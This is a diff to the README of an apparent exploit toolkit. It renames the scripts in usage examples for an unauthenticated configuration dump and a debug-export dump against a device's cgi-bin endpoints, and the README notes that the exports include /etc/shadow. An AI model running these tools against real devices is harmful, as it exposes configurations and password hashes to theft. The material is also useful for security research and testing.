@@ -7,7 +7,7 @@ All this does is dump the config out to a file for later shenanigans using the C
 
 For the [configuration dump exploit](https://seclists.org/fulldisclosure/2019/Jan/52), just set target, port, ssl on/off, and output directory. It will dump the configuration to there. 
 ```
-$ python getconfig.py -t x.x.x.x -p 8443 -s -d output
+$ python dump_config.py -t x.x.x.x -p 8443 -s -d output
 {+} Sending request to https://x.x.x.x:8443/cgi-bin/config.exp
 {*} We seem to have found a valid config! Writing to output/x.x.x.x_8443.conf
 $
@@ -18,7 +18,7 @@ You will want to decrypt this using the provided "decrypt.sh" script, or manuall
 The debug output not only gets you the config, but also backups of `/etc` and `/var`, and yes, the `/etc/shadow/` file is present.
 I'll eventually rewrite the decryption script in Python, but this was a quick kludge.
 ```
-$ python getdebug.py -t x.x.x.x -p 8443 -s -d output
+$ python dump_debug.py -t x.x.x.x -p 8443 -s -d output
 {+} Sending request to https://x.x.x.x:8443/cgi-bin/export_debug_msg.exp
 {*} We seem to have found a valid encrypted config! Writing to output/x.x.x.x_8443.enc
 $ ./decrypt.sh output/x.x.x.x_8443.enc 
